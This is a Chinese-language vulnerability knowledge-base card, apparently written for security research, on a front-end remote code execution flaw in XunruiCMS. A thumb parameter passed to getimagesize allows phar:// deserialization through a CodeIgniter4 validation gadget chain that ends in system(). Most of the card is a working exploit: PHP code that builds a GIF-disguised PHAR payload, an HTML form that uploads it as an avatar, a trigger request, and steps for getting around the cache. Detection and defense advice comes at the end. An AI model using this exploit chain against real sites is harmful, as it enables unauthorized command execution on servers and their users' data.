---
id: web-php-deserialization-xunruicms-qrcode-getimagesize-phar-ci4-system
title: 迅睿CMS 前台二维码接口 getimagesize 触发 PHAR 反序列化：CodeIgniter4 校验链 system 执行
type: scenario
domain: web
path: web/php/deserialization
technique: phar-deserialization-getimagesize-codeigniter4-validation-system
tags:
- php
- phar
- deserialization
- pop-chain
- codeigniter
- cms
- file-upload
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-16
  verified_at: '2026-11-08T08:11:58+08:00'
  notes: 已对照原文与23张图核对，最终危害确认打通：图19/23 请求 s=api&c=api&m=qrcode 返回 500 且弹出计算器，属真实命令执行而非仅反序列化。链路逐步对上：图1 确认入口就是 Api.php 的 public function qrcode()，图4 第73行 getimagesize($thumb) 与三段 strpos 判断（https:// 与 http:// 互斥导致 exit 永假）；图5 RedisHandler::__destruct 调 $this->redis->close()，图6 MemcachedHandler::close 调 $this->memcached->delete($this->lockKey)，图7 BaseModel::delete 在 tempAllowCallbacks 为真时 trigger('beforeDelete')，图8 trigger 的 foreach($this->{$event} as $callback) 任意方法调用；图9 validate 在 cleanValidationRules=false 时跳过清洗并 run($data,null,DBGroup)；图11/15 run 里 $data['DBGroup']=$dbGroup、图13 dot_array_search 回 $array[$currentIndex]；图17 processRules 的 is_callable($rule) 后直接 $rule($value) 即 system(命令)。缓存分支也核对一致：图22 文件名 md5($value.$thumb.$matrixPointSize.$errorCorrectionLevel)，图20 第二次返回 200+PNG 未触发、图23 改参数后恢复触发。未验证点/小偏差：原文 $thumb 实为 urldecode(urldecode(Service::L('input')->get('thumb')))，卡内写成 dr_get_input('thumb')（该 helper 实际用于 level），且 getimagesize 位于缓存未命中分支内，第一步必须先绕过 qrcode 缓存，卡内触发条件已提到但入口描述略简。版本：原文只给测试环境
    Xunruicms v4.6.4 + phpstudy 7.3.4 + Windows，并称更早版本同样存在、最新版已修复，无明确区间，affected_versions 保持为空。
url: /docs/web/php/deserialization/web-php-deserialization-xunruicms-qrcode-getimagesize-phar-ci4-system/
draft: false
kb_aliases:
- 迅睿CMS 前台 RCE
- Xunruicms 前台 PHAR 反序列化
- getimagesize 触发 phar
- CodeIgniter4 Validation::processRules 命令执行链
- CI4 RedisHandler destruct gadget
---

## 一句话结论

迅睿CMS 前台二维码接口把用户可控的 `thumb` 参数直接交给 `getimagesize()`，`phar://` 包装器解析攻击者上传的头像文件时反序列化 metadata，沿 CodeIgniter4 的 `__destruct → close → delete → trigger → validate → Validation::run → processRules` 链把规则名当函数、把 `DBGroup` 当参数，最终 `system($cmd)` 执行命令。

## 原理

- 入口是 `dayrui/Fcms/Control/Api/Api.php` 中前台可访问的 `qrcode()`。`$thumb` 取自 `dr_get_input('thumb')`，经 `get()` 的 `xss_clean()` 处理；`xss_clean()` 只做 HTML 标签/属性清洗，对 `phar://` 这类协议前缀无任何影响，因此不构成阻断。
- `qrcode()` 中有一段"地址规范"判断：`strpos($thumb,'https://') !== false && strpos($thumb,'/') !== false && strpos($thumb,'http://') !== false` 才 `exit`。`https://` 与 `http://` 在同一字符串中互斥，三个条件同时成立不可能出现，等价于该 `exit` 是死代码；因此 `phar://...` 不会被拦，继续往下执行到 `getimagesize($thumb)`。
- `getimagesize()` 属于会打开路径的文件函数，`phar://` 前缀会让 PHP 以 PHAR 容器解析目标文件；PHP 8.0 之前解析 manifest 时会对 metadata 执行 `unserialize()`，从而触发对象魔术方法。上传文件因此不需要 `.phar` 后缀，一个 GIF 头的"头像"即可承载 PHAR。
- 发布的 gadget 链（CodeIgniter4）：
  1. `CodeIgniter\Cache\Handlers\RedisHandler::__destruct()` 中 `$this->redis->close()`，`$redis` 可控。
  2. 指向 `CodeIgniter\Session\Handlers\MemcachedHandler::close()`：`isset($this->lockKey) && $this->memcached->delete($this->lockKey)`，`$memcached`、`$lockKey` 可控。
  3. 指向 `CodeIgniter\BaseModel::delete($id)`：`$this->tempAllowCallbacks` 为真时调用 `$this->trigger('beforeDelete', $eventData)`。
  4. `trigger()`：`foreach ($this->{$event} as $callback) { $eventData = $this->{$callback}($eventData); }`，`$event` 与 `$callback` 均来自对象属性，等于任意调用本类方法。选 `beforeDelete = ['abc' => 'validate']`，进入 `validate()`。
  5. `BaseModel::validate()`：`$rules = $this->getValidationRules();`，当 `cleanValidationRules` 为 `false` 时跳过清洗，`empty($rules)` 为假，于是执行 `$this->validation->setRules($rules, ...)->run($data, null, $this->DBGroup)`。若 `cleanValidationRules` 为真会走清洗分支，值被改写后可能提前 `return true`，链断掉，所以必须置 `false`。
  6. `Validation::run()`：先 `$data['DBGroup'] = $dbGroup;`，再 `foreach ($this->rules as $rField => $rSetup)`，`$value = dot_array_search($rField, $data)`。因为 `$data` 里刚被塞入 `DBGroup` 且其值就是攻击者控制的 `$dbGroup`，只要 `$rField` 取 `DBGroup`，`$value` 即完全可控。
  7. `processRules($rField, ..., $value, $rules, $data)`：`$callable = is_callable($rule)`，规则取 `system` 时为真，直接 `$passed = $rule($value)`，即 `system(命令)`。
- 关键约束：`$rules` 必须是形如 `['DBGroup' => 'system']` 的数组（键同时是 `dot_array_search` 的查找路径和 `processRules` 的函数名）；`DBGroup` 属性承载要执行的命令；`Validation` 的 `config` 指向自身、`ruleSetFiles` 给一个已存在类名（如 `stdClass`）避免加载失败。
- 上传侧障碍：头像上传会校验图片内容并拦截含 `php` 字样的文件，故 PHAR 用 `GIF89a` 作 stub 头；走页面自带上传会因内容缺失约 1KB 导致 PHAR 结构损坏，改用自建表单直接 POST 到 `index.php?s=member&c=account&m=avatar`（带 `is_form`、`is_admin`、`csrf_test_name`）可无损上传，服务端按 uid 命名保存。
- 重复触发失效的原因：`qrcode()` 会用 `WRITEPATH.'file/qrcode-'.md5($value.$thumb.$matrixPointSize.$errorCorrectionLevel).'-qrcode.png'` 生成缓存二维码，`IS_DEV && is_file($file)` 成立时直接复用缓存、跳过 `getimagesize()`。改任意一个 GET 参数（`size`/`text`/`level`）即改变 md5，恢复触发。

## 触发条件

- 目标为受影响的迅睿CMS 版本，前台可访问 `s=api&c=api&m=qrcode` 接口（原文以 v4.6.4 复现，称更早版本同样存在、最新版已修复；原文未给出具体版本区间）。
- 攻击者可在前台注册并上传头像（或其他可控内容、可控路径的上传点），且上传内容不被重新编码。
- 目标 PHP 版本在 `phar://` 打开时仍反序列化 metadata（PHP < 8.0），或应用显式反序列化 PHAR 内容。
- 服务器为 Windows/Linux 均可，命令执行以 Web 进程权限运行。

## 利用步骤

1. 确认 `thumb` 参数可控进入 `getimagesize()`，且"地址规范"判断可绕过（`phar://` 天然不满足）。
2. 本地生成 PHAR：`GIF89a` 开头 stub，metadata 为构造好的 `RedisHandler → MemcachedHandler → Model → Validation` 对象图。
3. 前台注册账号，用自建表单把 PHAR 以头像形式 POST 上传，得到 `uid.png` 形式的落盘路径。
4. 请求 `index.php?s=api&c=api&m=qrcode&...&thumb=phar://<上传文件绝对路径>`，触发反序列化与 `system()`。
5. 若返回 200 且响应为 PNG，说明走了二维码缓存分支未触发；修改 `size`/`text`/`level` 任一参数后重放。500 且命令执行（如弹出计算器）即成功。

## PoC

生成 PHAR（本地 PHP，`phar.readonly=Off`）：

```php
<?php
namespace CodeIgniter\Cache\Handlers {
    use CodeIgniter\Session\Handlers\MemcachedHandler;
    class RedisHandler {
        protected $redis;
        public function __construct(MemcachedHandler $m) { $this->redis = $m; }
    }
}
namespace CodeIgniter\Session\Handlers {
    use CodeIgniter\Model;
    use CodeIgniter\Validation\Validation;
    class MemcachedHandler {
        protected $memcached;
        public $lockKey;
        public function __construct($lockKey = '123', Model $model = null) {
            $this->lockKey = $lockKey;
            $this->memcached = $model ?: new Model(new Validation());
        }
    }
}
namespace CodeIgniter {
    use CodeIgniter\Validation\Validation;
    abstract class BaseModel {}
    class Model extends BaseModel {
        public $validation, $tempAllowCallbacks, $beforeDelete,
               $validationRules, $cleanValidationRules, $DBGroup;
        public function __construct(Validation $v, $cmd = 'calc') {
            $this->validation = $v;
            $this->tempAllowCallbacks = true;
            $this->beforeDelete = ['abc' => 'validate'];
            $this->validationRules = 'rules';
            $this->DBGroup = $cmd;          // 要执行的命令
            $this->cleanValidationRules = false;
        }
    }
}
namespace CodeIgniter\Validation {
    class Validation {
        protected $config;
        protected $rules = [];
        protected $ruleSetFiles;
        public function __construct() {
            $this->config = $this;
            $this->rules = ['DBGroup' => 'system'];   // 键=查找路径，值=函数名
            $this->ruleSetFiles = [0 => 'stdClass'];
        }
    }
}
namespace {
    use CodeIgniter\Cache\Handlers\RedisHandler;
    use CodeIgniter\Session\Handlers\MemcachedHandler;
    $phar = new Phar("shell.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a" . " __HALT_COMPILER(); ?>");
    $phar->setMetadata(new RedisHandler(new MemcachedHandler()));
    $phar->addFromString("test.txt", "test");
    $phar->stopBuffering();
}
```

上传（表单直传，绕开页面自带上传的截断）：

```html
<form action="http://target/index.php?s=member&c=account&m=avatar&r=8556"
      method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
  <input type="hidden" name="is_form" value="1">
  <input type="hidden" name="is_admin" value="0">
  <input type="hidden" name="csrf_test_name" value="<csrf>">
  <button type="submit">上传</button>
</form>
```

触发：

```
GET /index.php?s=api&c=api&m=qrcode&size=1111&text=11&level=1&thumb=phar://<站点根>/uploadfile/member/<uid>.png
```

## 变体与关联

- 同一入口的另一种链为文件写入，但受当前环境限制需要额外绕过，原文未展开，未验证。
- 触发函数可换成 `file_exists`、`filesize`、`md5_file`、`exif_read_data` 等任何会打开路径的函数；关键是参数可控且未限定协议。
- 上传侧可复用 GIF89a 前缀 polyglot 思路绕过图片内容校验；也可用其他可控路径点（附件、远程抓取等）落盘 PHAR。
- 关联：[[web-php-deserialization-phar-read-uploaded-image-pop-chain]]（同类"上传图片 + phar:// 触发"模式，但 gadget 与应用完全不同）、[[web-php-deserialization-phar-upload-jpg-wakeup-eval]]。框架侧 CI4 校验链思路与 [[web-php-deserialization-thinkphp8-resourceregister-pivot-validate-cookie-filtervalue-rce]] 的"校验器当调用器"结构相似。

## 检测与防御

- 不要对不可信路径调用 `getimagesize()` 等文件函数；对用户输入做协议白名单（只允许 `http/https` 或站内相对路径），而不是靠 XSS 过滤。
- 修复"地址规范"判断的逻辑错误（`https://` 与 `http://` 互斥导致条件永假），改为明确的 scheme 校验。
- 上传文件重命名 + 重新编码图片，禁止上传目录可被 `phar://` 解析；升级 PHP 8.0+ 并确保不使用显式反序列化 PHAR 内容的代码。
- 框架侧：`BaseModel::trigger()` 不应允许任意属性值作为方法名；`Validation::run()` 不应把规则名直接 `is_callable()` 调用；对 `DBGroup` 等属性做强类型约束。
- 检测：请求 `m=qrcode` 且 `thumb` 参数含 `phar://`；上传文件为图片后缀但含 `__HALT_COMPILER();` 结构；500 响应伴随命令执行痕迹；`file/qrcode-*.png` 缓存文件被反复生成/复用。
